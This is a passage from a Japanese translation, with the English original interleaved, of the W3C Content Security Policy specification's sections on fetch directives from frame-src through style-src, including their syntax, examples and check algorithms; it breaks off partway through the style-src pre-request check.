( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq† ~EQ `document^l
］~AND［
%要請 の`~target閲覧文脈$rqは`入子の閲覧文脈$である
］：
◎
If request’s type is "document" and target browsing context is a nested browsing context:
</p>

<p class="trans-note">【†
`行先$rqの誤記？（下の要請後~検査の “種別” も同様）
】</p>

		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="frame-src-post-request">
<h5 title="frame-src Post-request check">6.1.5.2. `frame-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>


<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ `document^l
］~AND［
%要請 の`~target閲覧文脈$rqは`入子の閲覧文脈$である
］：
◎
If request’s type is "document" and target browsing context is a nested browsing context:
</p>

		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>

</ol>



				</section>
			</section>
			<section id="directive-img-src">
<h4>6.1.6. `img-src^dir</h4>

<p>
`img-src@dir
指令は、［
どの~URLから画像~資源を読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The img-src directive restricts the URLs from which image resources may be loaded. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "img-src"
`directive-value$p = `serialized-source-list$p
</pre>

<p>
この指令は、画像を読込む`要請$
— 公式的には，次に該当する`要請$ —
を制御する
`FETCH$r
⇒
`種別$rq ~EQ `image^l
◎
This directive controls requests which load images. More formally, this includes requests whose type is "image" [FETCH].
</p>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `img-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは、~network~errorを返すことになる
— 供された~URLは，
`img-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match img-src's source list:
</p>

<pre class="html-code">
&lt;img src="https://not-example.com/img"&gt;
</pre>
</div>


				<section id="img-src-pre-request">
<h5 title="img-src Pre-request check">6.1.6.1. `img-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ `image^l
］：
◎
If request’s type is "image":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="img-src-post-request">
<h5 title="img-src Post-request check">6.1.6.2. `img-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ `image^l
］：
◎
If request’s type is "image":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-manifest-src">
<h4>6.1.7. `manifest-src^dir</h4>

<p>
`manifest-src@dir
指令は、［
~app~manifest `APPMANIFEST$r を読込んでもよい URL
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The manifest-src directive restricts the URLs from which application manifests may be loaded [APPMANIFEST]. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "manifest-src"
`directive-value$p = serialized-source-list
</pre>

<div class="example">
<p >
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `manifest-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`manifest-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match manifest-src's source list:
</p>

<pre class="html-code">
&lt;link rel="manifest" href="https://not-example.com/manifest"&gt;
</pre>

</div>

				<section id="manifest-src-pre-request">
<h5 title="manifest-src Pre-request check">6.1.7.1. `manifest-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ 空~文字列
］~AND［
%要請 の`起動元$rq ~EQ `manifest^l
］：
◎
If request’s type is "", and its initiator is "manifest":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="manifest-src-post-request">
<h5 title="manifest-src Post-request check">6.1.7.2. `manifest-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ 空~文字列
］~AND［
%要請 の`起動元$rq ~EQ `manifest^l
］：
◎
If request’s type is "", and its initiator is "manifest":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-media-src">
<h4>6.1.8. `media-src^dir</h4>

<p>
`media-src@dir
指令は、［
どの~URLから［
動画, 音声 および
結付けられている~text~track
］資源を読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The media-src directive restricts the URLs from which video, audio, and associated text track resources may be loaded. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "media-src"
`directive-value$p = `serialized-source-list$p
</pre>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `media-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`media-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match media-src's source list:
</p>

<pre class="html-code">
&lt;audio src="https://not-example.com/audio"&gt;&lt;/audio&gt;
&lt;video src="https://not-example.com/video"&gt;
    &lt;track kind="subtitles" src="https://not-example.com/subtitles"&gt;
&lt;/video&gt;
</pre>
</div>



				<section id="media-src-pre-request">
<h5 title="media-src Pre-request check">6.1.8.1. `media-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~IN { `audio^l, `video^l, `track^l }
］：
◎
If request’s type is one of "audio", "video", or "track":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="media-src-post-request">
<h5 title="media-src Post-request check">6.1.8.2. `media-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~IN { `audio^l, `video^l, `track^l }
］：
◎
If request’s type is one of "audio", "video", or "track":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-object-src">
<h4>6.1.9. `object-src^dir</h4>

<p>
`object-src@dir
指令は、［
どの~URLから~plugin内容を読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The object-src directive restricts the URLs from which plugin content may be loaded. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "object-src"
`directive-value$p = `serialized-source-list$p
</pre>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `object-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`object-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match object-src's source list:
</p>

<pre class="html-code">
&lt;embed src="https://not-example.com/flash"&gt;&lt;/embed&gt;
&lt;object data="https://not-example.com/flash"&gt;&lt;/object&gt;
&lt;applet archive="https://not-example.com/flash"&gt;&lt;/applet&gt;
</pre>
</div>

<p>
~URLを伴わない~pluginにより内容が読込まれる場合（おそらく、 `object$e 要素は `data$a 属性を欠いていて，指定された `type^a に基づいて何らかの既定~pluginを読込もうとしている）、
`object-src$dir の値が `none$pl ならば，阻止され~MUST
— 他の場合、許容されることになる。
◎
If plugin content is loaded without an associated URL (perhaps an object element lacks a data attribute, but loads some default plugin based on the specified type), it MUST be blocked if object-src's value is 'none', but will otherwise be allowed.
</p>

<p class="note">注記：
`object-src$dir 指令は、［
`object$e ／ `embed$e ／ `applet$e
］要素がそれ自身のために発行する どの要請に対しても動作する。
これには、前者の二つ（~naviも含む）により生成される
`入子の閲覧文脈$を拡充させるような要請も含まれる。
このことは、［
MIME 型が `text/html^c であるような `object$e 要素
］など，~dataが［
さもなければ別の指令により制約されるような内容
］に意味論的に等価であるときにも該当する。
◎
Note: The object-src directive acts upon any request made on behalf of an object, embed, or applet element. This includes requests which would populate the nested browsing context generated by the former two (also including navigations). This is true even when the data is semantically equivalent to content which would otherwise be restricted by another directive, such as an object element with a text/html MIME type.
</p>



				<section id="object-src-pre-request">
<h5 title="object-src Pre-request check">6.1.9.1. `object-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ 空~文字列
］~AND［
%要請 の`行先$rq ~EQ `unknown^l
］：
◎
If request’s type is "", and its destination is "unknown":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="object-src-post-request">
<h5 title="object-src Post-request check">6.1.9.2. `object-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ 空~文字列
］~AND［
%要請 の`行先$rq ~EQ `unknown^l
］：
◎
If request’s type is "", and its destination is "unknown":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
			</section>
			<section id="directive-script-src">
<h4>6.1.10. `script-src^dir</h4>

<p>
`script-src@dir
指令は、［
どの所在からの~scriptを実行してよいか
］を制約する。
これには、［
`script$e 要素の中に直接的に読込まれる~URL
］のみならず，［
~inline~script~blockや XSLT ~stylesheet `XSLT$r の様な，~script実行を誘発し得るもの
］も含まれる。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The script-src directive restricts the locations from which scripts may be executed. This includes not only URLs loaded directly into script elements, but also things like inline script blocks and XSLT stylesheets [XSLT] which can trigger script execution. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "script-src"
`directive-value$p = `serialized-source-list$p
</pre>

<p>
`script-src$dir
指令は、次について統治する：
◎
The script-src directive governs four things:
</p>

<ul>
	<li>
~script`要請$は、
`要請は~CSPにより阻止されるべきか？$A
に合格し~MUST
◎
Script requests MUST pass through §4.1.3 Should request be blocked by Content Security Policy?.
</li>
	<li>
~script`応答$は、
`要請に対する応答は~CSPにより阻止されるべきか？$A
に合格し~MUST。
◎
Script responses MUST pass through §4.1.4 Should response to request be blocked by Content Security Policy?.
</li>
	<li>
<p >
~inline `script$e 要素~blockは、
`要素における~inline型の挙動は~CSPにより阻止されるべきか？$A
合格し~MUST。
その挙動は、どの施策も 次のいずれかにより~inline~scriptを許容していない限り，阻止されることになる：
</p>

<ul ><li>`script-src$dir （または `default-src$dir ）指令を指定しないことにより、暗黙的に。
</li><li>その~inline~blockに合致する［
`unsafe-inline$pl ／
`nonce-source$p ／
`hash-source$p
］で，明示的に~whitelist化することにより。
</li></ul>

◎
Inline script blocks MUST pass through §4.2.3 Should element’s inline type behavior be blocked by Content Security Policy?. Their behavior will be blocked unless every policy allows inline script, either implicitly by not specifying a script-src (or default-src) directive, or explicitly, by whitelisting "unsafe-inline", a nonce-source or a hash-source that matches the inline block.
</li>
	<li>
<p>
次の~JS実行~sink†は、
`unsafe-eval$pl ~source式で通過制御される：
◎
The following JavaScript execution sinks are gated on the "unsafe-eval" source expression:
</p>
		<ul>
			<li>
`eval()$c
◎
eval()
</li>
			<li>
`Function()$c
◎
Function()
</li>
			<li>
第一~引数は~callableでない，
`setTimeout()$m
◎
setTimeout() with an initial argument which is not callable.
</li>
			<li>
第一~引数は~callableでない，
`setInterval()$m
◎
setInterval() with an initial argument which is not callable.
</li>
	</ul>

<p class="note">注記：
`setImmediate()^m や `execScript()^m
の様な非~標準~sinkを実装する~UAは、それらも
`unsafe-eval$pl 上で通過制御する~SHOULDである。
◎
Note: If a user agent implements non-standard sinks like setImmediate() or execScript(), they SHOULD also be gated on "unsafe-eval".
</p>
	</li>
</ul>

<p class="trans-note">【†
保安~文脈における~sink（ “槽” ）とは、~data~flowにおいて，最初に~app層に渡される，外部からの信用できない~data源を意味する（
<a href="https://code.google.com/p/domxsswiki/wiki/Sinks" >参考</a>
）。
実行~sink（ execution sink ）とは、~scriptの~sourceとして構文解析された上で実行され得る（したがって脆弱性の源になり得る）ような文字列~data源となる~sinkを意味する。
】</p>
<!-- 
~callable
Iscallable
-->



				<section id="script-src-pre-request">
<h5 title="script-src Pre-request check">6.1.10.1. `script-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ `script^l
］~AND［
%要請 の`行先$rq ~EQ `subresource^l
］：
◎
If request’s type is "script", and its destination is "subresource":
</p>
		<ol>
			<li>
~IF［
`~nonceは~source~listに合致するか？$A( %要請 の`暗号用~nonce~metadata$rq, %~list )
~EQ `合致es^i
］
⇒
~RET `許容ed^i
◎
If the result of executing §6.6.1.2 Does nonce match source list? on request’s cryptographic nonce metadata and this directive’s value is "Matches", return "Allowed".
</li>



			<li>
<p>
~IF［
この指令の`値$は［
`hash-source$p 文法に合致するような `~source式$
］を 1 個以上~包含する
］~AND［
%要請 の `完全性~metadata$rq ~NEQ 空~文字列
］：
◎
If this directive’s value contains one or more source expressions that match the hash-source grammar, and request’s integrity metadata is not the empty string, then:
</p>

				<ol>
					<li>
`完全性~sourceたち^v ~LET
%要請 の`完全性~metadata$rqを渡して，
`~metadataを構文解析-$した結果 `SRI$r
◎
Let integrity sources be the result of executing the Subresource Integrity §parse-metadata algorithm on request’s integrity metadata. [SRI]
</li>

					<li>
~Assert：
`完全性~sourceたち^v ~NEQ `~metadataなし^i
◎
Assert: integrity sources is not "no metadata".
</li>
					<li>
<p>
~IF［
`完全性~sourceたち^v 内のどの %~source に対しても，［
次の両者を満たす `~source式$ %式
］が %~list に包含されている
］…：
</p>

<ul ><li>%~source の `hash-algo^P 成分 ~EQ %式 の `hash-algorithm$p 成分
</li><li>%~source の `base64-value^P 成分 ~EQ %式 の `base64-value$p 成分
</li></ul>

<p>
…ならば
⇒
~RET `許容ed^i
— 完全性~合致に因り。
</p>

◎
Let bypass due to integrity match be true.
◎
For each source in integrity sources:
◎
If this directive’s value does not contain a source expression whose hash-algorithm is a case-sensitive match for source’s hash-algo component, and whose base64-value is a case-sensitive match for source’s base64-value, then set bypass due to integrity match to false.
◎
If bypass due to integrity match is true, return "Allowed".
</li>

				</ol>

<p class="note">注記：
ここで検証0するのは、［
%要請 の`完全性~metadata$rqで与えられる~metadataの集合
］が［
この指令により~whitelist化された `hash-source$p `~source式$たちの集合
］に包含されているかどうかまでである。
これは、応答において合致しない資源を阻止するときに，~browserによる Subresource Integrity `SRI$r の施行に依拠している。
◎
Note: Here, we verify only that the request contains a set of integrity metadata which is a subset of the hash-source source expressions whitelisted by this directive. We rely on the browser’s enforcement of Subresource Integrity [SRI] to block non-matching resources upon response.
</p>

			</li>
			<li>
<p>
~IF［
%~list は［
`~source式$ ~EQ~ACI `strict-dynamic$pl
］を包含する
］：
◎
If this directive’s value contains a source expression that is an ASCII case-insensitive match for the "'strict-dynamic'" keyword-source:
</p>

				<ol>
					<li>
<p>
~IF［
%要請 の`構文解析器~metadata$rq ~EQ `parser-inserted$l
］
⇒
~RET `阻止ed^i
◎
If the request’s parser metadata is "parser-inserted", return "Blocked".
</p>

<p>
~ELSE
⇒
~RET `許容ed^i
◎
Otherwise, return "Allowed".
</p>

<p class="note">注記：
`strict-dynamic$pl についての詳細は
<a href="#strict-dynamic-usage">`strict-dynamic^pl の用法</a>
節に。
◎
Note: "'strict-dynamic'" is explained in more detail in §8.2 Usage of "'strict-dynamic'".
</p>

					</li>
				</ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="script-src-post-request">
<h5 title="script-src Post-request check">6.1.10.2. `script-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>



<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ `script^l
］~AND［
%要請 の`行先$rq ~EQ `subresource^l
］：
◎
If request’s type is "script", and its destination is "subresource":
</p>
		<ol>
			<li>
~IF［
`~nonceは~source~listに合致するか？$A( %要請 の`暗号用~nonce~metadata$rq, %~list )
~EQ `合致es^i
］
⇒
~RET `許容ed^i
◎
If the result of executing §6.6.1.2 Does nonce match source list? on request’s cryptographic nonce metadata and this directive’s value is "Matches", return "Allowed".
</li>
			<li>
~Assert：［
%~list は `strict-dynamic$pl を包含しない
］~OR［
%要請 の`構文解析器~metadata$rq ~NEQ `parser-inserted$l
］
◎
Assert: This directive’s value does not contain "'strict-dynamic'", or request’s parser metadata is not "parser-inserted".
</li>

			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="script-src-inline">
<h5 title="script-src Post-request check">6.1.10.3. `script-src^dir ~inline検査</h5>

<p>
次の~algoが、この指令の`~inline検査$Aを与える：
◎
This directive’s inline check algorithm is as follows:
</p>

<p>
所与の
( `要素$ %要素, 文字列 %型, 文字列 %~source )
に対し：
◎
Given an Element (element), a string (type), and a string (source):
</p>

<ol>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%型 ~EQ `script attribute^l
］：
◎
If type is "script attribute":
</p>
		<ol>
			<li>
~IF［
%~list 内には［
`~source式$ ~EQ~ACI `strict-dynamic$pl
］がある
］~AND［
%~list 内には［
`~source式$ ~EQ~ACI `unsafe-hashed-attributes$pl
］はない
］
⇒
~RET `阻止ed^i
◎
If list contains a source expression which is an ASCII case-insensitive match for the keyword-source "'strict-dynamic'", and does not contain a source expression which is an ASCII case-insensitive match for the keyword-source "'unsafe-hashed-attributes'", return "Blocked".
</li>

			<li>
~IF［
`要素 は ( 型, ~source ) について~source~listに合致するか？$A( %要素, %~list, %型, %~source )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.2.2 Does element match source list for type and source? on element, this directive’s value, type, and source, is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>


	<li>
<p>
~IF［
%型 ~EQ `script^l
］：
◎
If type is "script":
</p>
		<ol>
			<li>
<p >
~IF［
%~list 内に［
`~source式$ ~EQ~ACI `strict-dynamic$pl
］はある
⇒
~RET `阻止ed^i
◎
If list contains a source expression which is an ASCII case-insensitive match for the keyword-source "'strict-dynamic'", return "Blocked".
</p>

<p class="note">注記：
`strict-dynamic$pl についての詳細は
<a href="#strict-dynamic-usage">`strict-dynamic^pl の用法</a>
節に。
◎
Note: "'strict-dynamic'" is explained in more detail in §8.2 Usage of "'strict-dynamic'".
</p>
			</li>
			<li>
~IF［
`要素 は ( 型, ~source ) について~source~listに合致するか？$A( %要素, %~list, %型, %~source )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.2.2 Does element match source list for type and source? on element, this directive’s value, type, and source, is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-style-src">
<h4>6.1.11. `style-src^dir</h4>

<p>
`style-src@dir
指令は、［
どの所在からの~styleを`文書$に適用してよいかどうか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The style-src directive restricts the locations from which style may be applied to a Document. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "style-src"
`directive-value$p = `serialized-source-list$p
</pre>

<p>
`style-src$dir 指令は、次について統治する：
◎
The style-src directive governs several things:
</p>

<ul>
	<li>
<p>
~style`要請$は、
`要請は~CSPにより阻止されるべきか？$A
に合格し~MUST。
これには、次のものが含まれる：
◎
Style requests MUST pass through §4.1.3 Should request be blocked by Content Security Policy?. This includes:
</p>
		<ul>
			<li>
`link$e 要素から生じている~stylesheet要請
◎
Stylesheet requests originating from a link element.
</li>
			<li>
<a href="~CASCADE#at-ruledef-import"><code class="css">@import</code></a>
規則から生じている~stylesheet要請
◎
Stylesheet requests originating from the @import rule.
</li>
			<li>
`Link$h ~HTTP応答~headerから生じている~stylesheet要請
`RFC5988$r
◎
Stylesheet requests originating from a Link HTTP response header field [RFC5988].
</li>
		</ul>
	</li>
	<li>
~style要請に対する`応答$は、
`要請に対する応答は~CSPにより阻止されるべきか？$A
に合格し~MUST。
◎
Responses to style requests MUST pass through §4.1.4 Should response to request be blocked by Content Security Policy?.
</li>
	<li>
<p>
~inline `style$e 要素~blockは、
`要素における~inline型の挙動は~CSPにより阻止されるべきか？$A
に合格し~MUST。
その~styleは、どの施策も 次のいずれかにより~inline~styleを許容していない限り，阻止されることになる：
</p>

		<ul>
			<li>
`style-src$dir （または `default-src$dir ）指令を指定しないことにより、暗黙的に。
</li>
			<li>
その~inline~blockに合致する［
`unsafe-inline$pl ／
`nonce-source$p ／
`hash-source$p
］で，明示的に~whitelist化することにより。
</li>
</ul>

◎
Inline style blocks MUST pass through §4.2.3 Should element’s inline type behavior be blocked by Content Security Policy?. The styles will be blocked unless every policy allows inline style, either implicitly by not specifying a style-src (or default-src) directive, or explicitly, by whitelisting "unsafe-inline", a nonce-source or a hash-source that matches the inline block.
</li>
	<li>
<p>
次の~CSS~algoは、 `unsafe-eval$pl ~source式で通過制御される：
◎
The following CSS algorithms are gated on the unsafe-eval source expression:
</p>
		<ul>
			<li>
`~CSS規則を挿入する$
◎
insert a CSS rule
</li>
			<li>
`~CSS規則を構文解析する$
◎
parse a CSS rule,
</li>
			<li>
`~CSS宣言~blockを構文解析する$
◎
parse a CSS declaration block
</li>
			<li>
`選択子の~groupを構文解析する$
◎
parse a group of selectors
</li>
	</ul>

<p>
これには、例えば， CSSOM の各種~interface上の［
`cssText^m 設定子 ／ `insertRule()^m ~method
］に対する すべての呼出が含まれることになる。
`CSSOM$r `HTML$r
◎
This would include, for example, all invocations of CSSOM’s various cssText setters and insertRule methods [CSSOM] [HTML].
</p>

<p class="issue">
これは、もっと良く説明される必要がある。
◎
This needs to be better explained.
</p>
	</li>
</ul>


				<section id="style-src-pre-request">
<h5 title="style-src Pre-request check">6.1.11.1. `style-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ `style^l
］：
◎
If request’s type is "style":
</p>

		<ol>
			<li>
~IF［
